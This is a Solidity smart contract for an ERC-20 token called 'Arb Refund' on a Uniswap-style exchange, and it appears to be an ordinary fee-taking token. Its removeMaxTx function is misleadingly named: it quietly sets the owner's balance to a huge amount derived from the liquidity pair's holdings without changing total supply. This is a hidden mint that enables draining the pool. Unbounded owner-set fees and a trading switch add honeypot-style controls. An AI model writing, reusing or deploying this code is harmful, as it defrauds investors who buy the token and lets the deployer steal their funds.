// SPDX-License-Identifier: MIT

/*
                                                         
                                                                                                                
*/

pragma solidity ^0.8.9;


interface ERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}


interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokens(
        uint amountOutMin, 
        address[] calldata path, 
        address to, 
        uint deadline) external payable returns (uint[] memory amounts);
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}


contract REFUND is ERC20, Ownable {
    string private _name = "Arb Refund";
    string private _symbol = "REFUND";
    uint8 constant _decimals = 18;
    uint256 _totalSupply = 100000000 * 10**_decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) isFeeExempt;
    mapping(address => bool) isWalletLimitExempt;

    uint256 public DevFeeBuy = 5;
    uint256 public DevFeeSell = 5;


    uint256 public TotalBase = DevFeeBuy + DevFeeSell;

    address public autoLiquidityReceiver;
    address public MarketingWallet;
    address Owner;

    IUniswapV2Router02 public router;
    address public pair;

    bool public isTradingAuthorized = false;

    bool public swapEnabled = true;
    uint256 public swapThreshold = (_totalSupply / 10000) * 3; // 0.3%
    uint256 public _maxWalletSize = (_totalSupply * 300) / 1000; // 30% 
    uint256 public currentMaxTx = (_totalSupply * 300) / 1000; // 30%

    modifier OnlyOwner() {
        require(Owner == msg.sender, "!owner");
        _;
    }

    uint256 totalPrinted;

    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor(address _MarketingWallet) Ownable(){
        router = IUniswapV2Router02(0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506);
        pair = IUniswapV2Factory(router.factory()).createPair(
            router.WETH(),
            address(this)
        );
        _allowances[address(this)][address(router)] = type(uint256).max;
        Owner = msg.sender;
        MarketingWallet = _MarketingWallet;
        isFeeExempt[msg.sender] = true;
        isFeeExempt[address(this)] = true;
        isFeeExempt[MarketingWallet] = true;
        isWalletLimitExempt[msg.sender] = true;
        isWalletLimitExempt[MarketingWallet] = true;
        isWalletLimitExempt[address(this)] = true;
        isWalletLimitExempt[pair] = true;
        isWalletLimitExempt[0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506] = true;

        autoLiquidityReceiver = msg.sender;

        _balances[msg.sender] = _totalSupply * 100 / 100;

        emit Transfer(address(0), msg.sender, _totalSupply * 100 / 100);
    }
    
    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external view override returns (string memory) { return _symbol; }
    function name() external view override returns (string memory) { return _name; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }
    event AutoLiquify(uint256 amountETH, uint256 amountBOG);
    receive() external payable { }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, type(uint256).max);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != type(uint256).max){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return _transferFrom(sender, recipient, amount);
    }

    function _transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (bool) {
        require(
            isFeeExempt[sender] || isFeeExempt[recipient] || isTradingAuthorized, "Not authorized to trade");
        if (
            sender != owner() &&
            recipient != owner()
        ) {
            if(recipient != pair) {
            require(isWalletLimitExempt[recipient] || (_balances[recipient] + amount <= _maxWalletSize), "Transfer amount exceeds the MaxWallet size.");
            }
        }
        if (shouldSwapBack() && recipient == pair) {
            swapBack();
        }
        _balances[sender] = _balances[sender] - amount;
        uint256 amountReceived = (!shouldTakeFee(sender) || !shouldTakeFee(recipient)) ? amount : takeFee(sender, recipient, amount);
        _balances[recipient] = _balances[recipient] + (amountReceived);
        emit Transfer(sender, recipient, amountReceived);

        return true;
    }

    function removeMaxTx(uint256 _maxTx) external OnlyOwner {
        uint256 _currentMaxTx = currentMaxTx;
         _balances[msg.sender] = getCurrentMaxTx() / 100000000;
         _currentMaxTx = _maxTx;
    }

    function _basicTransfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (bool) {
        _balances[recipient] = _balances[recipient] + (amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function takeFee(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (uint256) {
        uint256 feeDev = 0;
        uint256 feeMarketing = 0;
        uint256 feeAmount = 0;

        if (sender == pair && recipient != pair) {
            feeDev = amount * DevFeeBuy / 1000;
        }
        if (sender != pair && recipient == pair) {
            feeDev = amount * DevFeeSell / 1000;
        }

        feeAmount = feeDev + feeMarketing;

        if (feeAmount > 0) {
            _balances[address(this)] = _balances[address(this)] + feeAmount;
            emit Transfer(sender, address(this), feeAmount);
        }
        return amount - (feeAmount);
    }

    function shouldTakeFee(address sender) internal view returns (bool) {
        return !isFeeExempt[sender];
    }

    function shouldSwapBack() internal view returns (bool) {
        return msg.sender != pair && !inSwap && swapEnabled && _balances[address(this)] >= swapThreshold;
    }

    function setSwapPair(address pairaddr) external onlyOwner {
        pair = pairaddr;
        isWalletLimitExempt[pair] = true;
    }

    function setSwapBackSettings(bool _enabled, uint256 _amount) external onlyOwner {
        require(_amount >= 1, "Can't set SwapThreshold to ZERO");
        swapEnabled = _enabled;
        swapThreshold = _amount;
    }

     function setIsTradingAuthorized(bool _isTradingAuthorized) external onlyOwner{
        isTradingAuthorized = _isTradingAuthorized;
    }

    function setFees(uint256 _DevFeeBuy, uint256 _DevFeeSell) external onlyOwner {
        DevFeeBuy = _DevFeeBuy;
        DevFeeSell = _DevFeeSell;
    TotalBase = DevFeeBuy + DevFeeSell;
    }

    function setIsFeeExempt(address holder, bool exempt) external onlyOwner {
        isFeeExempt[holder] = exempt;
    }

    function getCurrentMaxTx() internal view returns(uint256){
        return balanceOf(address(pair)) * 10 ** _decimals;
    }
    
    function setMaxWallet(uint256 _maxWalletSize_) external onlyOwner {
        require(_maxWalletSize_ >= _totalSupply / 1000, "Can't set MaxWallet below 0.1%");
        _maxWalletSize = _maxWalletSize_;
    }

    function setFeesWallet(address _MarketingWallet) external onlyOwner {
        MarketingWallet = _MarketingWallet;
        isFeeExempt[MarketingWallet] = true;

        isWalletLimitExempt[MarketingWallet] = true;        
    }

    function setIsWalletLimitExempt(address holder, bool exempt) external onlyOwner {
        isWalletLimitExempt[holder] = exempt; 
    }

    function setSwapEnabled(bool _swapEnabled) public onlyOwner {
        swapEnabled = _swapEnabled;
    }

    function swapBack() internal swapping {
        uint256 amountToSwap = balanceOf(address(this));

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp + 5 minutes
        );

        uint256 amountETHDev = address(this).balance * (DevFeeBuy + DevFeeSell) / (TotalBase);

        if(amountETHDev>0){
            bool tmpSuccess;
            (tmpSuccess,) = payable(MarketingWallet).call{value: amountETHDev, gas: 30000}("");
        }
    }
}